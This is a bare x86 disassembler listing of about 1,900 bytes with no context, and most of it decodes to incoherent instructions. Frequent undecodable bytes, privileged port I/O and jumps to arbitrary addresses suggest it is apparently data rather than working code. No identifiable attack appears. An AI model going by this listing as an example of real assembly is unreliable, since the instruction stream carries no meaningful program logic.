  41383e:	and    edx,ebp
  413840:	(bad)  
  413841:	div    DWORD PTR ds:0x2a0f7e8b
  413847:	iretw  
  413849:	call   0x118b2e98
  41384e:	jmp    0x41385c
  413850:	das    
  413851:	(bad)  
  413852:	(bad)  
  413854:	and    BYTE PTR [edx+edx*2],ch
  413857:	push   ds
  413858:	push   ss
  413859:	cmp    BYTE PTR [edx],al
  41385b:	mov    ds:0x3e601fa0,al
  413860:	mov    WORD PTR [esi+0x44],es
  413863:	rol    DWORD PTR [eax-0x55077732],1
  413869:	sub    al,0x8c
  41386b:	arpl   WORD PTR [edx+0x16],sp
  41386e:	jg     0x41385d
  413870:	cmp    ebp,esp
  413872:	mov    edi,0x3fd3094
  413877:	test   al,0x6b
  413879:	aas    
  41387a:	test   eax,0x23f3ba95
  41387f:	call   0xce38:0x394ba183
  413886:	ins    DWORD PTR es:[edi],dx
  413887:	lahf   
  413888:	aaa    
  413889:	xchg   edx,eax
  41388a:	inc    ebx
  41388b:	mov    cs:0x4e40cea3,al
  413891:	add    ecx,edx
  413893:	xor    ah,BYTE PTR [ebp-0x2e]
  413896:	adc    dl,BYTE PTR [eax+ecx*2]
  413899:	mov    DWORD PTR [ebp+0x2a],esp
  41389c:	and    DWORD PTR [esp+edi*4+0x7d],0xffffffcb
  4138a1:	xlat   BYTE PTR ds:[ebx]
  4138a2:	jnp    0x4138a4
  4138a4:	and    DWORD PTR [ebp-0x2f],esp
  4138a7:	cmp    BYTE PTR [eax-0xa],dl
  4138aa:	adc    BYTE PTR [eax],dl
  4138ac:	(bad)  
  4138ad:	dec    eax
  4138ae:	mov    WORD PTR [eax],fs
  4138b0:	(bad)  
  4138b1:	popa   
  4138b2:	sub    BYTE PTR [esp+edi*4],dh
  4138b5:	retf   0xdc58
  4138b8:	and    BYTE PTR [ebx+0x38],bl
  4138bb:	mov    ah,0xd2
  4138bd:	(bad)  
  4138be:	scas   al,BYTE PTR es:[edi]
  4138bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138c0:	inc    ecx
  4138c1:	mov    ds:0xcf74f73,al
  4138c6:	jp     0x413874
  4138c8:	pop    edi
  4138c9:	repz dec esp
  4138cb:	inc    ebp
  4138cc:	mov    ds:0x1fe74079,al
  4138d1:	cwde   
  4138d2:	sbb    al,0x3c
  4138d4:	cli    
  4138d5:	sbb    al,BYTE PTR [ecx]
  4138d7:	cld    
  4138d8:	fadd   st,st(0)
  4138da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4138db:	aam    0xcc
  4138dd:	(bad)
  4138e1:	pop    ebp
  4138e2:	cmp    DWORD PTR [ecx+0x23],0x66
  4138e6:	xchg   esi,eax
  4138e7:	push   DWORD PTR [ebx]
  4138e9:	pop    DWORD PTR [eax]
  4138eb:	ja     0x413870
  4138ed:	jnp    0x41391b
  4138ef:	xchg   ecx,eax
  4138f0:	in     al,dx
  4138f1:	adc    esi,esp
  4138f3:	icebp  
  4138f4:	xchg   edx,eax
  4138f5:	dec    eax
  4138f6:	stos   BYTE PTR es:[edi],al
  4138f7:	pop    ebx
  4138f8:	icebp  
  4138f9:	mov    eax,0xbd5605f2
  4138fe:	xor    DWORD PTR [ebx+0x354763c6],esi
  413904:	mov    edi,0xeb01792c
  413909:	adc    ch,al
  41390b:	es pop edx
  41390d:	jo     0x4138b3
  41390f:	ins    DWORD PTR es:[edi],dx
  413910:	mov    ebp,0x11d6cedf
  413915:	adc    bl,BYTE PTR [eax-0x7a]
  413918:	int    0x43
  41391a:	dec    esi
  41391b:	add    DWORD PTR [bx],esp
  41391e:	scas   eax,DWORD PTR es:[edi]
  41391f:	pusha  
  413920:	stos   BYTE PTR es:[edi],al
  413921:	ror    BYTE PTR [edx-0xa54e439],1
  413927:	mov    dh,0xce
  413929:	jmp    0x4139a6
  41392b:	push   es
  41392c:	ret    
  41392d:	(bad)  
  41392e:	aam    0x53
  413930:	jo     0x41396a
  413932:	add    esp,DWORD PTR [edx+ebp*4-0x78]
  413936:	xor    BYTE PTR [ecx],dh
  413938:	or     cl,BYTE PTR [esi-0x5c]
  41393b:	push   edx
  41393c:	add    BYTE PTR [esi],0x62
  41393f:	ror    esp,1
  413941:	push   ss
  413942:	rol    BYTE PTR [esi+0x26d6fb81],cl
  413948:	sub    al,0x6
  41394a:	call   0xdd771b71
  41394f:	cli    
  413950:	mov    ds:0xbeeed81f,al
  413955:	fistp  DWORD PTR [edx]
  413957:	test   esp,esi
  413959:	in     al,dx
  41395a:	push   ebx
  41395b:	lock ins BYTE PTR es:[edi],dx
  41395d:	daa    
  41395e:	(bad)  
  41395f:	dec    esi
  413960:	imul   ebp,DWORD PTR [edi],0xffffff99
  413963:	popf   
  413964:	push   esi
  413965:	cs mov ebx,0xa236f83
  41396b:	popa   
  41396c:	imul   ecx,DWORD PTR [esi+edx*8],0xffffffff
  413970:	and    al,0xf4
  413972:	add    BYTE PTR [edi],bh
  413974:	(bad)  
  413975:	comiss xmm0,DWORD PTR ds:0x60e6d87b
  41397c:	sbb    cl,bl
  41397e:	mov    DWORD PTR [ecx],edi
  413980:	jmp    0x4139e2
  413982:	inc    esp
  413983:	call   0xe4710173
  413988:	cmc    
  413989:	fild   QWORD PTR [esi-0x7a9853a3]
  41398f:	jnp    0x4139dc
  413991:	mov    BYTE PTR [ecx],ah
  413993:	(bad)  
  413995:	pop    ebx
  413996:	cmp    DWORD PTR [ecx-0x7dfbc811],ecx
  41399c:	test   DWORD PTR [ebx],eax
  41399e:	adc    al,0xad
  4139a0:	pop    ecx
  4139a1:	push   cs
  4139a2:	inc    esp
  4139a3:	fisub  DWORD PTR [eax]
  4139a5:	fcomp  st(2)
  4139a7:	inc    edx
  4139a8:	rcr    DWORD PTR [ebp+0x23],cl
  4139ab:	les    ecx,FWORD PTR [edi+eax*4]
  4139ae:	xchg   ecx,eax
  4139af:	aam    0xeb
  4139b1:	dec    ecx
  4139b2:	pop    ss
  4139b3:	js     0x413986
  4139b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139b6:	rcl    BYTE PTR [esi],cl
  4139b8:	inc    eax
  4139b9:	push   ebp
  4139ba:	cdq    
  4139bb:	or     edi,0xffffffdf
  4139be:	loope  0x413a31
  4139c0:	xor    eax,0x4ad63ef6
  4139c5:	out    dx,eax
  4139c6:	test   al,0x13
  4139c8:	out    dx,al
  4139c9:	add    dh,BYTE PTR [esi-0x5c]
  4139cc:	push   esp
  4139cd:	xor    BYTE PTR [esi+0x771ef4d1],bh
  4139d3:	test   eax,0xa392ab27
  4139d8:	(bad)  
  4139d9:	fs push edi
  4139db:	sahf   
  4139dc:	sub    ebp,DWORD PTR [eax-0x48]
  4139df:	mov    bl,0x1
  4139e1:	mov    bl,0x8a
  4139e3:	pop    ds
  4139e4:	scas   al,BYTE PTR es:[edi]
  4139e5:	js     0x4139e9
  4139e7:	aaa    
  4139e8:	pop    ss
  4139e9:	loopne 0x4139c0
  4139eb:	shl    DWORD PTR [ebp+edi*8-0x4b6714d3],0x9d
  4139f3:	jmp    0x413a3c
  4139f5:	push   ss
  4139f6:	xchg   ebx,eax
  4139f7:	fisubr DWORD PTR [ebp+0x574d0267]
  4139fd:	jecxz  0x4139f6
  4139ff:	mov    esp,0x35102e4e
  413a04:	and    ebp,DWORD PTR [edx+edi*4+0x7cf3ce95]
  413a0b:	fadd   QWORD PTR [edi+0x5f25e6eb]
  413a11:	rcl    esp,cl
  413a13:	arpl   WORD PTR [eax+0x56],dx
  413a16:	mov    ds:0x62c5af30,al
  413a1b:	ds push edx
  413a1d:	jo     0x4139fc
  413a1f:	xchg   edi,eax
  413a20:	jb     0x413a3f
  413a22:	inc    ebp
  413a23:	(bad)  
  413a24:	mov    al,0xd0
  413a26:	in     eax,0xd0
  413a28:	push   edx
  413a29:	cdq    
  413a2a:	sbb    edx,DWORD PTR [esi]
  413a2c:	sbb    ebx,DWORD PTR [edi+0x789956ee]
  413a32:	and    al,0xf7
  413a34:	inc    esi
  413a35:	sbb    al,0x55
  413a37:	cwde   
  413a38:	out    dx,eax
  413a39:	mov    bl,0x85
  413a3b:	fld    QWORD PTR [edi]
  413a3d:	sub    ebx,eax
  413a3f:	and    al,0x2a
  413a41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a42:	cmp    DWORD PTR [eax+0xc],edi
  413a45:	push   edx
  413a46:	and    DWORD PTR [edx+0x4b],edx
  413a49:	mov    esi,0x47726cf
  413a4e:	test   DWORD PTR [ebx-0x4258f92b],esp
  413a54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a55:	ret    0x8e26
  413a58:	jns    0x413ad1
  413a5a:	stc    
  413a5b:	cmp    BYTE PTR [edi+0x4d],ah
  413a5e:	sti    
  413a5f:	repz dec ecx
  413a61:	fcomp  DWORD PTR [ecx-0x61]
  413a64:	test   DWORD PTR [edi],esi
  413a66:	bound  eax,QWORD PTR [edx+0x406addda]
  413a6c:	inc    ecx
  413a6d:	cdq    
  413a6e:	xor    al,0x0
  413a70:	mov    edi,0x7d09b0ea
  413a75:	mov    ch,0xec
  413a77:	push   ebx
  413a78:	js     0x413a61
  413a7a:	dec    ecx
  413a7b:	dec    eax
  413a7c:	popf   
  413a7d:	xchg   esi,eax
  413a7e:	ror    BYTE PTR [ebp+0x30],0x30
  413a82:	adc    edi,eax
  413a84:	xchg   ebx,eax
  413a85:	nop
  413a86:	add    DWORD PTR [ebx],edx
  413a88:	mov    dh,0xf9
  413a8a:	lock mov ecx,DWORD PTR [edx+0x55dc304e]
  413a91:	or     bh,bh
  413a93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a94:	and    cl,ch
  413a96:	pushf  
  413a97:	fdivrp st(3),st
  413a99:	sbb    dh,al
  413a9b:	movq   mm1,QWORD PTR [eax+ebx*2]
  413a9f:	push   ss
  413aa0:	pop    eax
  413aa1:	or     eax,0x6b86ca69
  413aa6:	out    0x27,al
  413aa8:	jp     0x413ad0
  413aaa:	mov    cl,0xcf
  413aac:	fs pop esi
  413aae:	add    ebx,eax
  413ab0:	sahf   
  413ab1:	sub    ebx,DWORD PTR [edx]
  413ab3:	push   ss
  413ab4:	pop    ebx
  413ab5:	push   ebp
  413ab6:	mov    BYTE PTR [edx+ebp*4],ah
  413ab9:	xchg   ebx,eax
  413aba:	mov    ch,0x27
  413abc:	pop    esi
  413abd:	pop    es
  413abe:	push   ds
  413abf:	xchg   edi,eax
  413ac0:	mov    dl,0xbe
  413ac2:	std    
  413ac3:	stos   BYTE PTR es:[edi],al
  413ac4:	ja     0x413a55
  413ac6:	mov    ecx,esp
  413ac8:	push   esp
  413ac9:	xchg   ebx,eax
  413aca:	(bad)  
  413acb:	retf   0x8236
  413ace:	fsub   QWORD PTR [eax-0x45]
  413ad1:	in     al,0xa4
  413ad3:	fwait
  413ad4:	test   bl,ch
  413ad6:	sbb    DWORD PTR [edx-0x7c],esi
  413ad9:	and    bh,BYTE PTR [edx+0x5]
  413adc:	sub    eax,0x2f44123e
  413ae1:	addr16 adc al,0x7f
  413ae4:	push   esi
  413ae5:	jge    0x413b0f
  413ae7:	xchg   esi,eax
  413ae8:	or     eax,DWORD PTR [eax+0x4a6d38e0]
  413aee:	add    ecx,edx
  413af0:	cmc    
  413af1:	push   0xffffffb2
  413af3:	mov    al,0xbe
  413af5:	(bad)  
  413af6:	fnstcw WORD PTR [edi-0x6f]
  413af9:	sbb    ebx,DWORD PTR [ecx]
  413afb:	cmp    al,0xc6
  413afd:	scas   eax,DWORD PTR es:[edi]
  413afe:	scas   al,BYTE PTR es:[edi]
  413aff:	in     al,dx
  413b00:	pop    esp
  413b01:	and    ch,ah
  413b03:	inc    ecx
  413b04:	(bad)  
  413b06:	out    0x74,al
  413b08:	pop    es
  413b09:	push   esp
  413b0a:	mov    ss,WORD PTR [eax+0x56]
  413b0d:	jne    0x413b2b
  413b0f:	lods   al,BYTE PTR ds:[esi]
  413b10:	shl    DWORD PTR [eax+ebp*1-0x52],0xf1
  413b15:	leave  
  413b16:	mov    bl,0x85
  413b18:	sti    
  413b19:	add    dh,BYTE PTR [edi+0x20]
  413b1c:	pushf  
  413b1d:	push   ds
  413b1e:	mov    bh,0xca
  413b20:	jp     0x413b02
  413b22:	sub    bl,cl
  413b24:	enter  0x210b,0x52
  413b28:	mov    ds,ecx
  413b2a:	mov    eax,ds:0xe50478bd
  413b2f:	and    DWORD PTR [eax+0x57],esi
  413b32:	and    DWORD PTR [eax-0x16],0x68c328b0
  413b39:	xchg   edi,eax
  413b3a:	aam    0x3d
  413b3c:	repz inc edx
  413b3e:	inc    edi
  413b3f:	(bad)  
  413b40:	retf   0x28fd
  413b43:	push   DWORD PTR [ecx]
  413b45:	inc    edx
  413b46:	nop
  413b47:	shr    BYTE PTR [edx],0xd6
  413b4a:	outs   dx,BYTE PTR ds:[esi]
  413b4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b4c:	shl    BYTE PTR [ecx+0x6c],1
  413b4f:	jmp    0x213cc931
  413b54:	jmp    0x4b00bc92
  413b59:	neg    BYTE PTR [ecx-0x12]
  413b5c:	add    BYTE PTR [ebx+0x4713a0f],0x44
  413b63:	fidiv  DWORD PTR [ecx+0x2ba76719]
  413b69:	xchg   esp,eax
  413b6a:	jecxz  0x413b7d
  413b6c:	(bad)  
  413b6d:	cs jmp 0x413b0e
  413b70:	push   esp
  413b71:	mov    esp,0x59f7cc62
  413b76:	pop    DWORD PTR [ebp+ecx*4+0x621d2408]
  413b7d:	inc    esp
  413b7e:	jmp    0x413bad
  413b80:	xchg   ebp,eax
  413b81:	fwait
  413b82:	mov    cl,0xb8
  413b84:	int3   
  413b85:	xlat   BYTE PTR ds:[ebx]
  413b86:	jne    0x413bce
  413b88:	xlat   BYTE PTR gs:[ebx]
  413b8a:	or     al,0x6a
  413b8d:	cdq    
  413b8e:	leave  
  413b8f:	xor    al,0x9
  413b91:	andps  xmm5,xmm7
  413b94:	push   eax
  413b95:	ret    
  413b96:	out    0x7,eax
  413b98:	mov    esi,0xb128c2
  413b9d:	scas   eax,DWORD PTR es:[edi]
  413b9e:	fdivr  QWORD PTR [eax]
  413ba0:	out    0xb3,al
  413ba2:	cmp    eax,0x9426a130
  413ba7:	sub    ch,BYTE PTR [eax]
  413ba9:	mov    ch,0xb1
  413bab:	mov    ch,ah
  413bad:	es in  eax,dx
  413baf:	(bad)  [ebp-0xfcc1eb]
  413bb5:	shr    BYTE PTR [esp+ecx*2],cl
  413bb8:	sbb    esp,eax
  413bba:	push   edx
  413bbb:	adc    BYTE PTR [esi+0x186639d2],bh
  413bc1:	jmp    0x413b7f
  413bc3:	inc    ebx
  413bc4:	jb     0x413bd8
  413bc6:	jp     0x413b82
  413bc8:	les    eax,FWORD PTR [ebp+ecx*4+0x66]
  413bcc:	inc    ebx
  413bcd:	push   cs
  413bce:	jl     0x413b9a
  413bd0:	cmp    BYTE PTR [ebp+0x7587d122],ch
  413bd6:	add    al,0xdf
  413bd8:	and    al,0x90
  413bda:	inc    ecx
  413bdb:	push   es
  413bdc:	imul   ecx,DWORD PTR [esi-0x5a],0x1
  413be0:	in     al,0x41
  413be2:	js     0x413b90
  413be4:	jo     0x413ba5
  413be6:	lds    esi,FWORD PTR [edx-0x59cf25be]
  413bec:	ficomp WORD PTR [esi]
  413bee:	mov    dl,0xd
  413bf0:	fidiv  DWORD PTR ds:0x895a1c70
  413bf6:	cdq    
  413bf7:	scas   al,BYTE PTR es:[edi]
  413bf8:	jnp    0x413b7e
  413bfa:	or     DWORD PTR [ebx],ebp
  413bfc:	stos   BYTE PTR es:[edi],al
  413bfd:	lods   eax,DWORD PTR ds:[esi]
  413bfe:	cmp    DWORD PTR [esi+0x34c64139],esi
  413c04:	and    ebx,DWORD PTR [ecx+0x528ce765]
  413c0a:	dec    DWORD PTR [edi+0x8]
  413c0d:	cmp    al,0xf1
  413c0f:	push   ebx
  413c10:	ins    DWORD PTR es:[edi],dx
  413c11:	mov    BYTE PTR [ecx-0x676bc44f],bh
  413c17:	mov    eax,fs
  413c19:	scas   al,BYTE PTR es:[edi]
  413c1a:	movhlps xmm6,xmm7
  413c1d:	(bad)  
  413c1e:	mul    DWORD PTR [edx]
  413c20:	ins    BYTE PTR es:[edi],dx
  413c21:	xchg   ecx,eax
  413c22:	outs   dx,DWORD PTR ds:[esi]
  413c23:	lods   eax,DWORD PTR ds:[esi]
  413c24:	lock dec DWORD PTR [bx+di]
  413c28:	inc    ecx
  413c29:	sub    al,0xff
  413c2b:	clc    
  413c2c:	pushf  
  413c2d:	arpl   WORD PTR [edi-0x4f6f529d],sp
  413c33:	pop    ds
  413c34:	and    DWORD PTR [ebx+0x4cdcc254],ecx
  413c3a:	or     ah,BYTE PTR [edi-0xc]
  413c3d:	xor    ebx,DWORD PTR [ebp+0x5132b370]
  413c43:	sub    eax,0x18f691bd
  413c48:	cmp    ebx,0x78
  413c4b:	pop    ecx
  413c4c:	pop    ss
  413c4d:	daa    
  413c4e:	pop    ebp
  413c4f:	fnsave [edx+0x23]
  413c52:	cmp    edx,DWORD PTR [esi]
  413c54:	bound  edx,QWORD PTR [esi+0x58f90c0e]
  413c5a:	pushf  
  413c5b:	xor    edi,DWORD PTR [eax-0x46edeaf]
  413c61:	js     0x413cd0
  413c63:	mov    esp,0xe10de5ef
  413c68:	rcr    BYTE PTR [ecx+0x28742fab],0xd7
  413c6f:	pushf  
  413c70:	jmp    0x413ced
  413c72:	cmp    dl,BYTE PTR [ecx-0x6f]
  413c75:	pop    esi
  413c76:	pop    esp
  413c77:	imul   edx,ecx,0xffffffd5
  413c7a:	push   ss
  413c7b:	sub    BYTE PTR [ebx+0x54],0x20
  413c7f:	out    0xe5,eax
  413c81:	ficomp WORD PTR [ebp-0x4d]
  413c84:	xor    ebx,DWORD PTR [ebx+0x60b25fc5]
  413c8a:	sub    al,0x4
  413c8c:	adc    eax,0x12c9e892
  413c91:	imul   esi,DWORD PTR [ebp-0x58f7f9a],0xe2000f8b
  413c9b:	dec    eax
  413c9c:	mov    ebp,0xebaa72b6
  413ca1:	mov    esi,DWORD PTR ds:0xad326427
  413ca7:	xchg   esp,eax
  413ca8:	and    ecx,esp
  413caa:	push   cs
  413cab:	mov    ecx,0x3fc32a9d
  413cb0:	out    dx,eax
  413cb1:	shl    DWORD PTR [eax-0x68613c88],0xaa
  413cb8:	loopne 0x413c8f
  413cba:	xchg   ebx,eax
  413cbb:	mov    ebx,0x16825266
  413cc0:	jl     0x413c59
  413cc2:	jno    0x413d0e
  413cc4:	lds    ecx,FWORD PTR ds:0x8b84a0fe
  413cca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ccb:	dec    ebp
  413ccc:	repz idiv BYTE PTR [edi+0x1cd28990]
  413cd3:	mov    esi,0x2a07d0a8
  413cd8:	es inc ebp
  413cda:	sub    eax,0x2deece36
  413cdf:	adc    ebx,DWORD PTR [esi+edx*4-0x58]
  413ce3:	rol    DWORD PTR [eax],1
  413ce5:	sub    edi,edx
  413ce7:	out    dx,eax
  413ce8:	fnstsw WORD PTR [ebp+0x4dc4074a]
  413cee:	xlat   BYTE PTR ds:[ebx]
  413cef:	js     0x413d41
  413cf1:	push   ds
  413cf2:	mov    ds:0xa5cf4c36,al
  413cf7:	sub    ebx,ecx
  413cf9:	dec    BYTE PTR [ebx-0x7b]
  413cfc:	aas    
  413cfd:	add    BYTE PTR [edi+0x3f],dl
  413d00:	imul   esp,DWORD PTR [eax+ebp*1-0x6d430fb9],0x3a
  413d08:	aaa    
  413d09:	fldcw  WORD PTR [edx+0x1dbb011d]
  413d0f:	mov    edi,DWORD PTR [esi+0x7]
  413d12:	cdq    
  413d13:	sbb    edi,DWORD PTR [edx]
  413d15:	imul   eax,DWORD PTR [esi+edi*4],0xf6912a91
  413d1c:	push   ds
  413d1d:	mov    edi,0xb78f2210
  413d22:	shr    BYTE PTR [ebp+esi*4+0x2dac1196],1
  413d29:	int3   
  413d2a:	repnz xchg edx,ebp
  413d2d:	inc    edi
  413d2e:	jge    0x413d7d
  413d30:	fistp  WORD PTR [eax-0x4329d60f]
  413d36:	push   edi
  413d37:	setne  ah
  413d3a:	retf   
  413d3b:	scas   eax,DWORD PTR es:[edi]
  413d3c:	cli    
  413d3d:	stc    
  413d3e:	cdq    
  413d3f:	aam    0x83
  413d41:	pop    ebp
  413d42:	test   al,0xf1
  413d44:	inc    ebp
  413d45:	and    esi,esi
  413d47:	xor    BYTE PTR [ebx+0x16],ch
  413d4a:	cmp    ebp,DWORD PTR [edx-0x49]
  413d4d:	into   
  413d4e:	xor    esp,edi
  413d50:	addr16 sbb al,0xdb
  413d53:	call   0x50d3:0x997d9602
  413d5a:	scas   eax,DWORD PTR es:[edi]
  413d5b:	push   ebp
  413d5c:	pop    ecx
  413d5d:	and    dh,0x5f
  413d60:	not    esp
  413d62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d63:	es js  0x413d98
  413d66:	nop
  413d67:	rol    DWORD PTR [eax],1
  413d69:	push   esp
  413d6a:	xor    eax,0xde708ca8
  413d6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d70:	mov    ah,0x39
  413d72:	stos   DWORD PTR es:[edi],eax
  413d73:	dec    ebp
  413d74:	fsub   DWORD PTR [eax+edi*8+0x47]
  413d78:	mov    bl,0x3d
  413d7a:	adc    ebp,DWORD PTR ss:[eax+0x3952c037]
  413d81:	inc    esi
  413d82:	or     edx,DWORD PTR [edx+0x22]
  413d85:	mov    al,ds:0xa6ff382a
  413d8a:	lahf   
  413d8b:	sbb    BYTE PTR [ecx+0x24903f89],al
  413d91:	push   ss
  413d92:	and    ebx,DWORD PTR [eax+0x43]
  413d95:	popf   
  413d96:	sub    DWORD PTR [eax+0x3],0xffffffc2
  413d9a:	ds popf 
  413d9c:	retf   0x769e
  413d9f:	popa   
  413da0:	xchg   ecx,eax
  413da1:	jle    0x413d4d
  413da3:	jecxz  0x413d7e
  413da5:	add    DWORD PTR [esi],edx
  413da7:	in     al,0xf5
  413da9:	and    DWORD PTR [ebx+0x57a612a],esi
  413daf:	adc    DWORD PTR [ebx+0x6a],0xffffff82
  413db3:	fmul   DWORD PTR [esi+0x34]
  413db6:	xlat   BYTE PTR ds:[ebx]
  413db7:	cdq    
  413db8:	and    eax,0xf9c72044
  413dbd:	pop    esp
  413dbe:	add    BYTE PTR [edx],dl
  413dc0:	add    ch,ah
  413dc2:	sbb    eax,0xbff0ad82
  413dc7:	add    al,0x2d
  413dc9:	daa    
  413dca:	mov    cl,0x5c
  413dcc:	inc    esp
  413dcd:	sub    bl,BYTE PTR [ecx+0x11e7a9b1]
  413dd3:	add    eax,0xb8efa941
  413dd8:	mov    edx,0xf225ec35
  413ddd:	sub    bl,BYTE PTR [ebp+0x775ae33]
  413de3:	pop    eax
  413de4:	xor    edx,ebp
  413de6:	mov    edi,0x5042d6d6
  413deb:	gs adc al,0x74
  413dee:	push   esi
  413def:	or     bl,BYTE PTR [ebx-0x320b5ca2]
  413df5:	daa    
  413df6:	repnz push ebp
  413df8:	in     al,0xc8
  413dfa:	dec    edi
  413dfb:	pop    es
  413dfc:	mov    dh,0xa2
  413dfe:	mov    ch,0x14
  413e00:	add    al,BYTE PTR [edx-0x69]
  413e03:	mov    esp,0x811e6784
  413e08:	sub    eax,0xd3af26f9
  413e0d:	xchg   ebp,eax
  413e0e:	fnsave [eax]
  413e10:	inc    edi
  413e11:	mov    bl,0x1
  413e13:	test   eax,0xf490ea84
  413e18:	mov    ecx,0x8b8950e3
  413e1d:	call   0x6c334e35
  413e22:	pop    ebx
  413e23:	mov    cl,0x6c
  413e25:	leave  
  413e26:	or     dl,BYTE PTR [esi-0x4875e4cf]
  413e2c:	and    DWORD PTR [edi],esp
  413e2e:	pop    esp
  413e2f:	add    eax,esi
  413e31:	hlt    
  413e32:	push   0x65
  413e34:	mov    ebp,0xf6854b87
  413e39:	mov    WORD PTR [edi],gs
  413e3b:	outs   dx,BYTE PTR ds:[esi]
  413e3c:	mov    fs,esp
  413e3e:	push   ebp
  413e3f:	out    0x60,al
  413e41:	mov    esi,0x1449c564
  413e46:	rcl    esi,0xf2
  413e49:	push   ds
  413e4a:	jg     0x413eaf
  413e4c:	retf   
  413e4d:	aaa    
  413e4e:	and    DWORD PTR [ecx],esp
  413e50:	push   ecx
  413e51:	int3   
  413e52:	rcr    BYTE PTR [ebx+ecx*4-0x7f],0x2b
  413e57:	dec    eax
  413e58:	es bnd jl 0x413de5
  413e5c:	out    dx,eax
  413e5d:	loop   0x413e22
  413e5f:	pusha  
  413e60:	sbb    al,0xa1
  413e62:	loop   0x413ecb
  413e64:	jl     0x413e47
  413e66:	repnz adc al,0xfe
  413e69:	add    edi,DWORD PTR [ebx-0x1874d09b]
  413e6f:	arpl   WORD PTR [ebx+0x65],si
  413e72:	mov    gs,WORD PTR [eax]
  413e74:	mov    cl,0x0
  413e76:	sub    DWORD PTR [edx-0x6a],0xe8753a89
  413e7d:	ror    BYTE PTR [eax+0x7befd446],cl
  413e83:	js     0x413ee5
  413e85:	sub    al,0xd7
  413e87:	inc    edi
  413e88:	cmp    DWORD PTR [ebx],ebx
  413e8a:	pushf  
  413e8b:	fnsave [edi+esi*1+0x5f]
  413e8f:	mov    eax,ds:0x22beb8b
  413e94:	cmc    
  413e95:	stc    
  413e96:	pop    esp
  413e97:	enter  0xa6dc,0x12
  413e9b:	sbb    cl,BYTE PTR [edx]
  413e9d:	nop
  413e9e:	sahf   
  413e9f:	fidiv  DWORD PTR [edx-0x3d87484a]
  413ea5:	ror    DWORD PTR [edx+0x78],cl
  413ea8:	mov    bh,bh
  413eaa:	xlat   BYTE PTR ds:[ebx]
  413eab:	pop    ebp
  413eac:	gs push edx
  413eae:	sbb    BYTE PTR [edx-0x39],cl
  413eb1:	cmp    eax,0x366dd5a6
  413eb6:	xchg   esi,eax
  413eb7:	mov    eax,ds:0xf8875583
  413ebc:	(bad)  
  413ebd:	cdq    
  413ebe:	push   0xffffffad
  413ec0:	in     al,dx
  413ec1:	cmp    BYTE PTR fs:[ecx+0x33],ah
  413ec5:	push   edx
  413ec6:	std    
  413ec7:	test   BYTE PTR [edx],al
  413ec9:	(bad)  
  413eca:	stc    
  413ecb:	repz jae 0x413f10
  413ece:	xchg   ebp,eax
  413ecf:	out    0x5c,al
  413ed1:	fidiv  WORD PTR [edx+0x6b]
  413ed4:	push   0x5d
  413ed6:	mov    edx,0x21e965f7
  413edb:	ror    DWORD PTR [ecx],cl
  413edd:	adc    al,0xee
  413edf:	jle    0x413ed6
  413ee1:	nop
  413ee2:	sub    al,0x33
  413ee4:	xchg   edi,eax
  413ee5:	dec    eax
  413ee6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ee7:	cli    
  413ee8:	pushf  
  413ee9:	fmul   DWORD PTR [ebp+eiz*8+0x6093a7ae]
  413ef0:	cmp    BYTE PTR [edx+0x2d7c10bc],ch
  413ef6:	xor    ah,dh
  413ef8:	imul   eax,esi,0xffffff9b
  413efb:	push   esp
  413efc:	mov    bl,0x52
  413efe:	pop    edi
  413eff:	and    eax,0xd0de14c
  413f04:	xor    BYTE PTR [eax],ah
  413f06:	rol    DWORD PTR [esi+esi*1+0x4b24d792],0x33
  413f0e:	jecxz  0x413f6b
  413f10:	xor    eax,0xc7a745ae
  413f15:	popa   
  413f16:	inc    edi
  413f17:	test   eax,0x65ad0690
  413f1c:	fimul  DWORD PTR [edi+0x37d7cad]
  413f22:	es sar esi,0x37
  413f26:	cs fadd st,st(7)
  413f29:	fnsave cs:[ecx-0x45]
  413f2d:	mov    dl,0xac
  413f2f:	(bad)  
  413f30:	icebp  
  413f31:	sbb    BYTE PTR [ebp-0x2145548c],dl
  413f37:	(bad)  [edx-0x73050148]
  413f3d:	pusha  
  413f3e:	lods   eax,DWORD PTR ds:[esi]
  413f3f:	push   eax
  413f40:	mov    WORD PTR [ecx-0x7c58d93c],?
  413f46:	mov    esp,0x57c62544
  413f4b:	jae    0x413ed8
  413f4d:	mov    eax,0xcf5d121e
  413f52:	jns    0x413f90
  413f54:	mov    esi,0x9cd18015
  413f59:	push   edi
  413f5a:	jns    0x413fcf
  413f5c:	add    ah,BYTE PTR [eax+ecx*2]
  413f5f:	call   FWORD PTR [edi-0x2e]
  413f62:	popa   
  413f63:	in     eax,dx
  413f64:	daa    
  413f65:	inc    ebp
  413f66:	pop    es
  413f67:	mov    DWORD PTR [ebx],ebp
  413f69:	in     al,0x65
  413f6b:	lods   al,BYTE PTR ds:[esi]
  413f6c:	or     ebx,DWORD PTR [edx*2+0x3dc4eb]
  413f73:	int3   
  413f74:	fstp   TBYTE PTR [eax+ebx*1+0x1f38243c]
  413f7b:	repz addr16 call 0xc33f:0xf1d5efe4
  413f84:	(bad)  
  413f85:	fsubp  st(4),st
  413f87:	push   ebp
  413f88:	pop    eax
  413f89:	push   eax
  413f8a:	push   ds
  413f8b:	inc    ebx
  413f8c:	outs   dx,BYTE PTR ds:[esi]
  413f8d:	icebp  
  413f8e:	fimul  WORD PTR [ebp+esi*1-0x2bb88e93]
  413f95:	not    DWORD PTR [eax]
  413f97:	into   
  413f98:	cmp    edx,0x3ba3370d
  413f9e:	ins    DWORD PTR es:[edi],dx
  413f9f:	pusha  
  413fa0:	test   BYTE PTR [edx-0x597f3cd2],ah
  413fa6:	dec    ecx
  413fa7:	fcom   DWORD PTR [edx-0x50966a9e]
  413fad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413fae:	cmp    BYTE PTR ds:0xfd1ccd9c,cl
  413fb4:	test   BYTE PTR [eax+0x34],bh
  413fb7:	xchg   edx,eax
